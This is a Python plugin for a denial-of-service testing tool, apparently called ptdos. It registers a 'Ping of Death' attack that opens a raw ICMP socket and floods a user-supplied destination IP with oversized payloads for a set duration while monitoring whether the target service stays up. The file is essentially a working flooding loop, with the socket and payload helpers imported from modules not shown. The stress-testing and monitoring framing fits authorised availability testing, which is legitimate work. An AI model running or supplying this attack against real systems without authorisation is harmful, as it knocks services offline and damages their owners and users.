"""ptdos extension that adds a PingOfDeath attack."""
# sudo python3 ptdos.py -a pingofdeath -d 5 -dst 192.168.0.80

# own libs
from infrastructure import factory
from monitoring.ptcheckservice import attack_append_out_data, attack_checkservice_review, print_error
from misc.globalfuncs import generate_payload
from misc.pt_socket import create_socket
# external libs
from dataclasses import dataclass
from socket import error
from time import time, asctime, sleep
from ptlibs.ptmisclib import out_if, ptprint


@dataclass
class PingOfDeath:

    category: str
    name: str

    def launch_attack(self, args, dst, duration, use_json, json_obj, json_no, monitoring, att_start_t_epoch, att_start_t_asc) -> None:
        """Main function responsible for launching the attack."""
        packets = 0

        # initialize icmp ping_of_death socket
        sock = create_socket(self.name)

        # fill payload with data
        payload = generate_payload(self.name)

        # checkservice start monitoring
        monitoringprocess = monitoring.call_checkservice_repeatedly(use_json)

        try:
            while True:  # while loop to stop the attack after time specified in duration runs out
                if time() - att_start_t_epoch >= duration:
                    sock.close()  # stop attack
                    monitoringprocess()  # stop checkservice end monitoring
                    sleep(1)  # wait for 1 second to stop the monitoring process
                    att_end_t_asc = asctime()  # save attack's ending time
                    attack_checkservice_review(monitoring, use_json, json_obj, json_no, self.name)
                    break

                # do the PingOfDeath attack
                try:
                    # Send it to the target host.
                    sock.sendto(payload, (dst, 1))
                    packets += 1

                except error:
                    sock.close()  # close socket
                    sock = create_socket(self.name)  # create new socket

            # append attack outcome data to JSON object or print info to console
            attack_append_out_data(use_json, json_obj, json_no, self.name, duration, att_start_t_asc, att_end_t_asc, dst, packets)

            # append checkservice outcome data to JSON object or print info to console
            monitoring.checkservice_append_out_data(json_obj, use_json, json_no)

            # print JSON object to console if self.use_json == TRUE
            ptprint(out_if(json_obj.get_all_json(), "", use_json))

            return

        except BaseException as err:
            sock.close()  # stop attack
            monitoringprocess()  # stop checkservice end monitoring
            return print_error(json_obj, use_json, json_no, self.name, err.args[0])

    @staticmethod
    def make_help():
        """Help for attack printed out in main file ptdos.py."""
        return [
            {"Ping of Death attack options": [
                ["NOTE: Run this DoS with sudo. Payload is 8192B for macOS and 65535B for other platforms."],
                ["-a", "--attack", "<attack>", "Attack name - pingofdeath"],
                ["-d", "--duration", "<duration>", "Attack duration in seconds. Default 10 seconds."],
                ["-dst", "--destination", "<dst>", "Specify destination IP."]
            ]
            }
        ]

    @staticmethod
    def make_args(parser):
        """Specify arguments needed for the attack"""


def register() -> None:
    """Register attack in factory."""
    factory.register("pingofdeath", PingOfDeath)
